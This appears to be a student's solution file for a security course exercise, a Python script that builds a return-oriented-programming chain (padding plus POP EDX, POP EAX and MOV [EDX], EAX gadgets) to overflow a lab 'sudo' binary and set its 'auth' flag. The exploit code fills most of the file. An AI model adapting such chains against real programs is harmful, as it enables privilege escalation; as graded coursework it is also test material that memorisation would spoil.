import os
import sys
import base64
import struct 

import addresses
from infosec.core import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP Write Gadget, modify the
    `auth` variable and print `Victory!`. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.AUTH` to get the address of the `auth` variable.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """  
    search = GadgetSearch(LIBC_DUMP_PATH)  

    ra = 0x080488b0

    msg = ('A'*135).encode('utf-8')
    msg += struct.pack('<I',search.find('POP EDX'))
    msg += struct.pack('<I',addresses.AUTH)
    msg += struct.pack('<I',search.find('POP EAX'))
    msg += struct.pack('<i',1)
    msg += struct.pack('<I',search.find('MOV [EDX], EAX'))
    msg += struct.pack('<I',ra)
    print(msg)
    return msg


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
